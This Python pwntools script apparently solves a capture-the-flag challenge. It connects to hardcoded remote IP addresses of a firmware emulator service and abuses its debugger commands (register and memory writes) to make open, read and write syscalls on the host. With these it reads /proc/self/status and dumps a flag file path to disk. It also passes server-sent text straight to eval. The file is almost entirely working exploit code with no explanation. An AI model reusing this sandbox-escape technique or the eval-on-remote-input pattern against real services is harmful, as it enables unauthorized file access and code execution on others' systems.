from pwn import *

#r = remote('39.107.32.202', 8090)
context.log_level = 'debug'
r = remote('117.50.14.29', 8090)

def check():
    r.recvline()
    express = r.recv()[:-6:]
    result = eval(express)
    r.sendline(str(result))
    print r.recvuntil('breakpoint at 0: 0xffff0000')

def download(start, end, length):
    with open('./bin', 'w') as f:
        while start < end:
            payload = "mem_r " + str(hex(start)) + " " + str(hex(length))
            r.sendline(payload)
            res = r.recvuntil('>>')
            print res
            f.write(res[:-3:])
            start+=length

def setreg(reg, val):
    p = 'reg_w %s %#x' % (reg, val)
    r.sendlineafter(">>", p)

def memw(addr, val):
    for i in range(len(val)):
        p = 'mem_w %#x %#x' % (addr+i, ord(val[i]))
        r.sendlineafter('>>', p)

def step():
    r.sendlineafter(">>", "s")

def op(filename, flag):
    setreg('PC', syscall)
    setreg('r1', 0x2)
    setreg('r6', 0x33332000)
    setreg('r5', 0)
    memw(0x33332000, filename+'\x00')
    step()
    
def rd(fd, buf, size):
    setreg('r1', 0x0) # rax = 0 read
    setreg('r6', fd) # rdi = fd
    setreg('r5', buf) # rsi = buf
    setreg('r4', size) # rdx = len
    setreg('PC', syscall)
    step()

def wr(fd, buf, size):
    setreg('r1', 0x1) # rax = 1 write
    setreg('r6', fd) # fd
    setreg('r5', buf) # rsi = buf
    setreg('r4', size) # rdx = len
    setreg('PC', syscall)
    step()

check()
r.interactive()

PC = 0xffff0000
SP = 0x33331000
syscall = 0xffff0838
setreg('SP', SP)
setreg('PC', syscall)
setreg('r1', 0x2)
setreg('r6', 0x33332000)
memw(0x33332000,'/proc/self/status\x00')
#memw(0x33332000,'/home/xx_fw_re/qwb_xx_fw_re_workdir/xx_fw_re_ykduEWgwrXo_4d29adbfb1f027870509ec9b38259ca2/flag')
#memw(0x33332000,'/home/xx_fw_re/qwb_xx_fw_re_workdir/flag')
step()

rd(3, 0x33332000, 0x100)
wr(1, 0x33332000, 0x100)

r.recvuntil('PPid:')
ppid = int(r.recvline())
print ppid

setreg('SP', SP)

#op('/home/xx_fw_re/qwb_xx_fw_re_workdir/xx_fw_re_ykduEWgwrXo_4d29adbfb1f027870509ec9b38259ca2/'+sys.argv[1], 0)
prev = ''
for i in range(1000):
    rd(4, 0x33330000, 0x3000)
    wr(1, 0x33330000, 0x3000)
    buf = r.recvuntil('PC = 0xffff083a\n', drop=True)
    if buf == prev:
        log.info('over!')
        break
    write(sys.argv[1], buf, mode='a')
    prev = buf

r.interactive()
